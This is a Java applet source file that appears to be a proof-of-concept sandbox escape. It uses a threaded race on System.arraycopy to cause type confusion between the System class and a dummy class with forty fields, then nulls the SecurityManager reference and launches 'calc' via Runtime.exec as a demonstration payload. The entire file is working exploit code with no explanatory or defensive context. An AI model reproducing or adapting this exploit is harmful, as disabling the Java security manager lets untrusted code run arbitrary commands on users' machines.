import java.applet.*;

public class LolJava extends Applet {
	@Override
	public void start() {
		super.start();
		System.out.println("Starting two threads.");
		CopyThread copy = new CopyThread();
		new Thread(copy).start();
		new Thread(new SwapThread(copy)).start();
	}
	public static class CopyThread implements Runnable {
		public Class munge1 = System.class;
		public DerpClass munge2 = new DerpClass();
		public Object[] srcarray = {munge1};
		public DerpClass[] destarray = {null};
		public boolean running = true;
		public void run() {
			while(true) {
				try {
					System.arraycopy(srcarray, 0, destarray, 0, 1);
				} catch (ArrayStoreException e) {
				}
				if (((Object) destarray[0]) == munge1) break;
			}
			System.out.println("Done.");
			running = false;
			SecurityManager securityManager = System.getSecurityManager();
			DerpClass out = destarray[0];
			if (out.f0 == securityManager) out.f0 = null;
			else if (out.f1 == securityManager) out.f1 = null;
			else if (out.f2 == securityManager) out.f2 = null;
			else if (out.f3 == securityManager) out.f3 = null;
			else if (out.f4 == securityManager) out.f4 = null;
			else if (out.f5 == securityManager) out.f5 = null;
			else if (out.f6 == securityManager) out.f6 = null;
			else if (out.f7 == securityManager) out.f7 = null;
			else if (out.f8 == securityManager) out.f8 = null;
			else if (out.f9 == securityManager) out.f9 = null;
			else if (out.f10 == securityManager) out.f10 = null;
			else if (out.f11 == securityManager) out.f11 = null;
			else if (out.f12 == securityManager) out.f12 = null;
			else if (out.f13 == securityManager) out.f13 = null;
			else if (out.f14 == securityManager) out.f14 = null;
			else if (out.f15 == securityManager) out.f15 = null;
			else if (out.f16 == securityManager) out.f16 = null;
			else if (out.f17 == securityManager) out.f17 = null;
			else if (out.f18 == securityManager) out.f18 = null;
			else if (out.f19 == securityManager) out.f19 = null;
			else if (out.f20 == securityManager) out.f20 = null;
			else if (out.f21 == securityManager) out.f21 = null;
			else if (out.f22 == securityManager) out.f22 = null;
			else if (out.f23 == securityManager) out.f23 = null;
			else if (out.f24 == securityManager) out.f24 = null;
			else if (out.f25 == securityManager) out.f25 = null;
			else if (out.f26 == securityManager) out.f26 = null;
			else if (out.f27 == securityManager) out.f27 = null;
			else if (out.f28 == securityManager) out.f28 = null;
			else if (out.f29 == securityManager) out.f29 = null;
			else if (out.f30 == securityManager) out.f30 = null;
			else if (out.f31 == securityManager) out.f31 = null;
			else if (out.f32 == securityManager) out.f32 = null;
			else if (out.f33 == securityManager) out.f33 = null;
			else if (out.f34 == securityManager) out.f34 = null;
			else if (out.f35 == securityManager) out.f35 = null;
			else if (out.f36 == securityManager) out.f36 = null;
			else if (out.f37 == securityManager) out.f37 = null;
			else if (out.f38 == securityManager) out.f38 = null;
			else if (out.f39 == securityManager) out.f39 = null;
			else {
				System.out.println("Nope. :(");
			}
			try {
				Runtime.getRuntime().exec("calc");
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static class SwapThread implements Runnable {
		public CopyThread copy;
		public SwapThread(CopyThread copy) {
			this.copy = copy;
		}
		public void run() {
			while(copy.running) {
				copy.srcarray[0] = copy.munge1;
				copy.srcarray[0] = copy.munge2;
			}
		}
	}

	public static class DerpClass {
		public Object f0, f1, f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12, f13, f14, f15, f16, f17, f18, f19, f20, f21, f22, f23, f24, f25, f26, f27, f28, f29, f30, f31, f32, f33, f34, f35, f36, f37, f38, f39;
	}
}